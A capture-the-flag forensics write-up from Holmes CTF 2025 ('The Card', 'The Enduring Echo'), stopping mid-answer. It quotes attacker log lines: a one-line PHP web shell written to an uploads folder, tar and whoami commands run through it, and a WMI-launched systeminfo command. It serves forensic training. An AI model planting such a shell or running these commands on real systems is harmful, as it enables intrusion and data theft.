<!doctype html>
<html
  lang="en-us" 
  data-theme-mode="auto"
  >
  <head><meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/><title>
  Holmes CTF 2025 - The Card | Diep Manh Tuan
</title>
<meta
  name="description"
  content="Digital Forensics | @VSL.0utl4w"
/><script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://tu4nsecc.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
  
</script>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>
<link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
<meta property="og:type" content="website" />
  <meta property="og:title" content="Holmes CTF 2025 - The Card | Diep Manh Tuan" />
  <meta
    property="og:description"
    content="Digital Forensics | @VSL.0utl4w"
  />
  <meta property="og:url" content="https://tu4nsecc.github.io/posts/holmes-ctf-2025/" />
  <meta
    property="og:site_name"
    content="Welcome to my blog"
  />
  <meta
    property="og:image"
    content="/images/holmes_2025/the_card/anh1.png"
  />
  <meta property="article:author" content="Diep Manh Tuan" />
  <meta property="article:published_time" content="2025-09-27T14:20:00&#43;07:00" />
  <meta property="article:modified_time" content="2025-09-27T14:20:00&#43;07:00" /><meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/holmes_2025/the_card/anh1.png" />
<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.4144fa01088e2f1aeffb738e4d6a4e5ee43adcecf79d0e39d50414c5234dada0.css" />
<link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
    rel="stylesheet"
    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
  <body><div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg></div><div class="loading-word">Loading...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>
<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
This article does not have a corresponding language version
</div>
<div id="heatmap-tooltip"></div><div id="container">
      <div id="wrap"><div id="header-nav">
  <nav id="main-nav"><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/">Home</a>
      </span><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/about">About</a>
      </span><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/friend">Friend</a>
      </span><a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav"></nav></div>
<header id="header"><picture></picture>
    <img  fetchpriority="high" src="/images/holmes_2025/the_card/anh1.png" alt="Holmes CTF 2025 - The Card"><div id="header-outer">
    <div id="header-title"><span id="logo">
            <h1 data-aos="slide-up">Holmes CTF 2025 - The Card</h1>
          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
  </div>
</header><div id="content"
          
          class="sidebar-right"  ><aside id="sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
<div class="sidebar-toc-wrapper toc-div-class">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#holmes-ctf-2025--the-card">Holmes CTF 2025 – The Card</a></li>
    <li><a href="#holmes-ctf-2025--the-enduring-echo">Holmes CTF 2025 – The Enduring Echo</a></li>
  </ul>
</nav>
</div></div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img
    data-src="/avatar/images/tuan.jpg"
    data-sizes="auto"
    alt="Diep Manh Tuan"
    class="lazyload"
  />
  <div class="sidebar-author-name">Diep Manh Tuan</div>
  <div class="sidebar-description">Digital Forensics | @VSL.0utl4w</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">1</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      2
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </a>
</div>
<div class="sidebar-social"></div>
<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">About</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/friend"
        aria-label="Friend"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Friend</div>
    </div></div>
</div><div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div></div>
  </div><div class="sidebar-widget"></div></div></aside>
<section id="main"><article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta"><div class="article-date">
  <span
    class="article-date-link icon-calendar"
    data-aos="zoom-in"
  >
    <time datetime="2025-09-27 14:20:00 &#43;0700 &#43;07" itemprop="datePublished"
      >2025-09-27</time
    >
    <time style="display: none;" id="post-update-time"
      >2025-09-27</time
    >
  </span></div>
<div class="article-category"><a
      class="article-category-link"
      href="/categories/ctf"
      data-aos="zoom-in"
      >CTF</a
    ><a
      class="article-category-link"
      href="/categories/writeup"
      data-aos="zoom-in"
      >WRITEUP</a
    ></div>
</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="holmes-ctf-2025--the-card">
<a class="header-anchor" href="#holmes-ctf-2025--the-card"></a>
Holmes CTF 2025 – The Card
</h1><p><img src="/images/holmes_2025/the_card/anh1.png" alt="Challenge Banner"></p>
<p>Holmes CTF 2025 Event Link: <a href="https://ctf.hackthebox.com/event/2536">https://ctf.hackthebox.com/event/2536</a><br>
Challenge name: <strong>The Card</strong><br>
Difficulty: <strong>Easy</strong><br>
Describe: Holmes receives a breadcrumb from Dr. Nicole Vale – fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.</p>
<hr>
<h2 id="question-1">
<a class="header-anchor" href="#question-1"></a>
Question 1
</h2><p>Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale&rsquo;s honeypot. (string)</p>
<p>*From the provided snippet of the access.log, we can see the following entry:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-01 08:23:12 121.36.37.224 - - [01/May/2025:08:23:12 +0000] 
&#34;GET /robots.txt HTTP/1.1&#34; 200 847 &#34;-&#34; &#34;Lilnunc/4A4D - SpecterEye&#34;
</code></pre><p>Breaking it down:
Timestamp: 2025-05-01 08:23:12<br>
Source IP: 121.36.37.224 (attacker)<br>
Request: GET /robots.txt HTTP/1.1<br>
Response code: 200 (successful request)<br>
User-Agent: &ldquo;Lilnunc/4A4D - SpecterEye&rdquo;</p>
<p>Since this is the earliest recorded request from the attacker, the User-Agent value clearly indicates the tool or script they were using.</p>
<p>Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">Lilnunc/4A4D - SpecterEye
</code></pre><hr>
<h2 id="question-2">
<a class="header-anchor" href="#question-2"></a>
Question 2:
</h2><p>It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? (filename.ext)</p>
<p>Log Analysis:</p>
<ol>
<li>Application log evidence
In application.log, we see that the attacker successfully deployed a backdoor web shell:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by 121.36.37.224 - command: &#39;echo &#34;&amp;lt;?php system($_GET[&#34;cmd&#34;]); ?&amp;gt;&#34; &gt; /var/www/html/uploads/temp_4A4D.php&#39;
2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by 121.36.37.224
</code></pre><p>This shows the exact filename and path of the malicious PHP web shell: <code>/uploads/temp_4A4D.php</code></p>
<ol start="2">
<li>Access log confirmation
Later, the attacker starts interacting with the uploaded file:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-18 15:02:12 121.36.37.224 &#34;GET /uploads/temp_4A4D.php?cmd=ls -la /var/www/html/uploads/&#34; ...
2025-05-18 15:02:23 121.36.37.224 &#34;GET /uploads/temp_4A4D.php?cmd=whoami&#34; ...
2025-05-18 15:02:34 121.36.37.224 &#34;GET /uploads/temp_4A4D.php?cmd=tar -czf /tmp/exfil_4A4D.tar.gz /var/www/html/config/ /var/log/webapp/&#34; ...
</code></pre><p>Here we clearly see the attacker executing system commands (ls, whoami, tar) through the PHP web shell.</p>
<ol start="3">
<li>WAF log observation
The WAF also detected this malicious activity but shows that the attacker bypassed protections:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-15 11:25:12 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - PHP web shell temp_4A4D.php created
</code></pre><p>Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">temp_4A4D.php
</code></pre><hr>
<h2 id="question-3">
<a class="header-anchor" href="#question-3"></a>
Question 3:
</h2><p>The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated? (filename.ext)</p>
<p>Log Analysis:</p>
<ol>
<li>Access log evidence
From the access.log, we can see the attacker downloading a large SQL file:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-18 14:58:23 121.36.37.224 - - [18/May/2025:15:58:23 +0000] 
&#34;GET /uploads/database_dump_4A4D.sql HTTP/1.1&#34; 200 52428800 &#34;-&#34; &#34;4A4D RetrieveR/1.0.0&#34;
</code></pre><p>This indicates a successful download of the file <code>database_dump_4A4D.sql</code>.</p>
<ol start="2">
<li>Application log confirmation
The application log also records this exfiltration attempt:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-18 14:58:23 [CRITICAL] webapp.security - Database dump accessed - database_dump_4A4D.sql downloaded by 121.36.37.224
</code></pre><ol start="3">
<li>WAF log validation
Finally, the WAF confirms the event, showing the attacker bypassed protections:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">2025-05-18 14:58:23 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: DATABASE_DOWNLOAD - Action: BYPASS - Database file download: database_dump_4A4D.sql
</code></pre><p>Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">database_dump_4A4D.sql
</code></pre><hr>
<h2 id="question-4">
<a class="header-anchor" href="#question-4"></a>
Question 4:
</h2><p>During the attack, a seemingly meaningless string seems to be recurring. Which one is it? (string)</p>
<p>Log Analysis:
Reviewing the logs across different stages of the attack, one specific string keeps showing up:</p>
<ul>
<li>User-Agent: <code>Lilnunc/4A4D - SpecterEye</code></li>
<li>Web shell filename: <code>temp_4A4D.php</code></li>
<li>Exfiltrated files: <code>backup_2025_4A4D.tar.gz</code>, <code>database_dump_4A4D.sql</code>, <code>config_4A4D.json</code></li>
<li>Backdoor &amp; persistence mechanisms: <code>/tmp/.system_update_4A4D</code>, SSH key named <code>backdoor_4A4D</code></li>
</ul>
<p>Across reconnaissance, exploitation, persistence, and exfiltration, the attacker consistently embeds the same marker.</p>
<p>Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">4A4D
</code></pre><hr>
<h2 id="question-5">
<a class="header-anchor" href="#question-5"></a>
Question 5:
</h2><p>OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.</p>
<p><img src="/images/holmes_2025/the_card/anh2.png" alt="CTI Graph"></p>
<p>Analysis:</p>
<ol>
<li>Accessing the CTI platform
We were given three possible Docker instances to investigate:
http://94.237.51.202:31849/
http://94.237.51.202:52486/
http://94.237.51.202:40489/
The first one (:31849) loads the CogWork-Intel Graph interface, as shown in the screenshot.</li>
<li>Entity types and connections
In the graph view, different types of entities are shown with unique colors:
-Campaigns (red)
-Infrastructure, Indicators, Malware, Tools, Organizations, etc.</li>
<li>Identifying the honeypot attack link
On the left, we see an Investigation Alert:
-“JM signature (4A4D) detected across multiple breach campaigns. Investigate entity connections for attribution patterns.”
-This confirms the platform has associated the attacker’s recurring marker (4A4D) with several campaigns.</li>
<li>Counting campaigns
Looking at the graph:
-The entity labeled JM (center node, related to Nicole Vale’s honeypot) is connected to five red nodes.
-Each red node corresponds to a campaign entity.
-This means the CTI platform has correlated the honeypot attack with five separate campaigns.
Conclusion:
The honeypot attack is linked to:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">5
</code></pre><hr>
<h2 id="question-6">
<a class="header-anchor" href="#question-6"></a>
Question 6:
</h2><p>How many tools and malware in total are linked to the previously identified campaigns? (number)
-Analysis:</p>
<ol>
<li>From Question 5, we already identified that the honeypot attack (JM signature 4A4D) is linked to 5 campaigns.</li>
<li>In the CogWork-Intel Graph view (screenshot of http://94.237.51.202:31849/), each campaign node (red) has connections to other entities such as:</li>
</ol>
<ul>
<li>Tools (brown)</li>
<li>Malware (dark red)</li>
</ul>
<ol start="3">
<li>By counting all the tools and malware linked to those 5 campaigns, we get a total of 9 entities.
Conclusion:
The total number of tools and malware linked to the identified campaigns is:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">9
</code></pre><hr>
<h2 id="question-7">
<a class="header-anchor" href="#question-7"></a>
Question 7:
</h2><p>It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash? (sha-256 hash)
Analysis:</p>
<ol>
<li>In the CogWork-Intel Graph view (http://94.237.51.202:31849/), selecting the malware indicator entity (indicator&ndash;bio-falsifier-hash-2025-0004) reveals its details.</li>
<li>On the right-hand side under Description and Properties, we see the malware identified as BioMetric Falsifier targeting medical monitoring systems.</li>
<li>The Pattern field provides the hash value:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">{file:hashes.SHA256 = &#39;7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477&#39;}
</code></pre><p><img src="/images/holmes_2025/the_card/anh3.png" alt="Malware Hash"></p>
<p>This confirms the SHA-256 hash of the recurring malware.
Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
</code></pre><hr>
<h2 id="question-8">
<a class="header-anchor" href="#question-8"></a>
Question 8:
</h2><p>Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)
Analysis:</p>
<ol>
<li>Accessing the platform
When logging into the second instance (http://94.237.51.202:52486/) with the provided credentials, we can search for the malware hash previously identified in Question 7:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
</code></pre><ol start="2">
<li>Detailed malware analysis
The malware is shown as neurostorm_implant_4A4D.bin with the following attributes:
File Type: ELF 64-bit executable
Detections: 45/72 engines flagging it as malicious
Attribution: James Moriarty–themed attacks
Campaign ID: 4A4D-NEUROSTORM</li>
<li>Critical infrastructure
Scrolling down in the analysis view, under Critical C2 Infrastructure, we find the following entry:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">74.77.74.77
Primary Command &amp; Control Server
Ports: 443, 8080, 4444
</code></pre><p>This identifies the IP address the malware communicates with.
Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">74.77.74.77
</code></pre><hr>
<h2 id="question-9">
<a class="header-anchor" href="#question-9"></a>
Question 9:
</h2><p>What is the full path of the file that the malware created to ensure its persistence on systems? (/path/filename.ext)</p>
<p><img src="/images/holmes_2025/the_card/anh4.png" alt="Persistence Evidence"><br>
Analysis:
From the CogWork Security Platform – Behavioral Analysis section, we can observe the malware’s activity:</p>
<p>*Network Activity</p>
<p>-HTTPS → 74.77.74.77:443
-TCP → 74.77.74.77:7474 (Backdoor listener port)
-TCP → 74.77.74.77:8080 (Secondary C2 channel)
-DNS → 4a4d-nullinc.revenge.onion (Tor hidden service)</p>
<p>*File Operations</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">CREATE → /opt/lilnunc/implant/4a4d_persistence.sh   (21:46:30 20/7/2025)
CREATE → /etc/lilnunc/4a4d_config.xml               (21:46:45 20/7/2025)
</code></pre><p><img src="/images/holmes_2025/the_card/anh5.png" alt="Persistence File"></p>
<p>*Registry Operations</p>
<ul>
<li>MODIFY → /etc/rc.local
Conclusion:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">/opt/lilnunc/implant/4a4d_persistence.sh
</code></pre><hr>
<h2 id="question-10">
<a class="header-anchor" href="#question-10"></a>
Question 10:
</h2><p>Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA&rsquo;s infrastructure. How many open ports does the server have?</p>
<p><img src="/images/holmes_2025/the_card/anh6.png" alt="Open Ports"></p>
<p>Analysis:</p>
<ol>
<li>
<p>Accessing the platform
Navigating to the third instance (http://94.237.51.202:40489/) loads the CogNet Scanner interface.</p>
</li>
<li>
<p>Searching for the C2 server
We query the previously identified C2 IP address:74.77.74.77</p>
</li>
<li>
<p>Scan results
The scanner flags the host and displays its details:
-Location: United Kingdom (CogWork-1 Networks)
-Role: Enterprise Management Server
-Status: Flagged as malicious</p>
</li>
<li>
<p>Open ports
The result lists the following services:</p>
</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">22/tcp    ssh
25/tcp    smtp
53/udp    dns
80/tcp    http
110/tcp   pop3
143/tcp   imap
443/tcp   https
3389/tcp  rdp
7477/tcp  unknown
8080/tcp  http-proxy
8443/tcp  https-alt

Counting them gives a total of 11 open ports.

Conclusion:
```velocity
11
</code></pre><hr>
<h2 id="question-11">
<a class="header-anchor" href="#question-11"></a>
Question 11:
</h2><p>Which organization does the previously identified IP belong to? (string)</p>
<p><img src="/images/holmes_2025/the_card/anh7.png" alt="Organization Evidence"></p>
<p>Analysis:</p>
<ol>
<li>
<p>From Question 10, we identified the threat actor’s C2 server as 74.77.74.77.</p>
</li>
<li>
<p>Using the CogNet Scanner Platform (http://94.237.51.202:40489/), the Overview tab of the scan results provides network information.</p>
</li>
<li>
<p>The details show:</p>
</li>
</ol>
<ul>
<li>IP Address: 74.77.74.77</li>
<li>Device Type: Enterprise Management Server</li>
<li>Operating System: Ubuntu Server 18.04 LTS</li>
<li>Hostname: msp-sense-33.local</li>
<li>Organization: SenseShield MSP
Thus, the organization linked to the IP is SenseShield MSP.
Conclusion:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">SenseShield MSP
</code></pre><p>Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">SenseShield MSP
</code></pre><hr>
<h2 id="question-12">
<a class="header-anchor" href="#question-12"></a>
Question 12:
</h2><p>One of the exposed services displays a banner containing a cryptic message. What is it? (string)</p>
<p><img src="/images/holmes_2025/the_card/anh8.png" alt="Service Banner"></p>
<p>Analysis:</p>
<ol>
<li>
<p>Using the CogNet Scanner Platform (http://94.237.51.202:40489/), we switched to the Services tab to review banners from all detected open ports.</p>
</li>
<li>
<p>Most services displayed standard banners (e.g., OpenSSH, Postfix SMTP, Dovecot POP3/IMAP, nginx).</p>
</li>
<li>
<p>However, the service running on port 7477/tcp (unknown service) revealed a unique banner containing a cryptic phrase:He&rsquo;s a ghost I carry, not to haunt me, but to hold me
together - NULLINC REVENGE</p>
</li>
</ol>
<p>Conclusion:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">He&#39;s a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE
</code></pre><h1 id="holmes-ctf-2025--the-enduring-echo">
<a class="header-anchor" href="#holmes-ctf-2025--the-enduring-echo"></a>
Holmes CTF 2025 – The Enduring Echo
</h1><p>Challenge name:<strong>The Enduring Echo</strong>
Difficulty:<strong>Easy</strong>
Describe:LeStrade passes a disk image artifacts to Watson. It&rsquo;s one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.</p>
<h2 id="question-1-1">
<a class="header-anchor" href="#question-1-1"></a>
Question 1:
</h2><p>What was the first (non cd) command executed by the attacker on the host? (string)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<p><img src="/images/holmes_2025/the_enduring_echo/anh1.png" alt="Organization Evidence"></p>
<ul>
<li>I located the process creation event in the Windows Security log (Event ID 4688 — A new process has been created).</li>
<li>The NewProcessName is C:\Windows\System32\cmd.exe</li>
<li>The CommandLine field for this event is:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">cmd.exe /Q /c systeminfo 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1
</code></pre><ul>
<li>That command line shows cmd.exe launching systeminfo and redirecting its output (1&gt;) to \127.0.0.1\ADMIN$__1756075857.955773, with stderr (2&gt;&amp;1) merged into stdout.</li>
</ul>
<p><strong>Interpretation</strong></p>
<ol>
<li>
<p>The first non-cd command executed by the attacker was systeminfo. The presence of cmd.exe /Q /c systeminfo confirms systeminfo is the actual command the attacker ran.</p>
</li>
<li>
<p>systeminfo is a common reconnaissance command — it prints operating system and system configuration information (OS version, build, installed hotfixes, hardware info, boot time, etc.). Attackers often run it early to learn system details (OS build, domain membership, etc.) that help plan next steps or choose appropriate exploits/tools.</p>
</li>
<li>
<p>The redirection portion 1&gt; \127.0.0.1\ADMIN$__1756075857.955773 is notable:</p>
</li>
</ol>
<ul>
<li>The attacker attempted to write the command output to a network path (an SMB share). \127.0.0.1\ADMIN$ would target the local host’s administrative share — this pattern can indicate an attempt to exfiltrate output via SMB, stage files, or simply to persist output somewhere accessible.</li>
<li>The use of 127.0.0.1 is odd if the intent was remote exfiltration (127.0.0.1 resolves to localhost). It could mean: a misuse/mistake, an attempt to avoid detection by writing to the admin share via loopback, or the attacker was running the same command through a lateral- or proxy-type setup where 127.0.0.1 is meaningful in that context (for example, a pivoted session).</li>
</ul>
<ol start="4">
<li>Parent process (ParentProcessName) is C:\Windows\System32\wbem\WmiPrvSE.exe. That strongly suggests the systeminfo invocation was launched by the WMI Provider Host process — typical when a remote WMI command was used (remote command execution via WMI) or when a scheduled/remote management task invoked cmd.exe. This indicates remote execution through WMI or a WMI-based management tool rather than an interactive local console.</li>
</ol>
<p><strong>Why this matters</strong></p>
<ol>
<li>Running systeminfo early is consistent with discovery activity. Combined with the fact it was launched by WmiPrvSE.exe and redirected to an admin share, this event indicates the attacker was performing automated discovery and trying to capture results in a location accessible to their process.</li>
<li>This event is a helpful starting point for an investigation: it gives the first clear indicator of attacker activity (a specific command and its redirection), and it suggests a remote vector (WMI) to investigate further.</li>
</ol>
<p><strong>onclusion:</strong></p>
<p>The first User-Agent used by the attacker is:</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">systeminfo
</code></pre><h2 id="question-2-1">
<a class="header-anchor" href="#question-2-1"></a>
Question 2:
</h2><p>Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
-Similarly, in question 1, the answer is</p>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">C:\Windows\System32\wbem\WmiPrvSE.exe
</code></pre><h2 id="question-3-1">
<a class="header-anchor" href="#question-3-1"></a>
Question 3:
</h2><p>Which remote-execution tool was most likely used for the attack? (filename.ext)</p>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">wmiexec.py
</code></pre><p><strong>Evidence &amp; where it was found</strong></p>
<ol>
<li>
<p>The parent process spawning the attacker’s commands is C:\Windows\System32\wbem\WmiPrvSE.exe (WMI Provider Host), and the first observed command line was cmd.exe /Q /c systeminfo 1&gt; \127.0.0.1\ADMIN$__1756075857.955773 2&gt;&amp;1.</p>
</li>
<li>
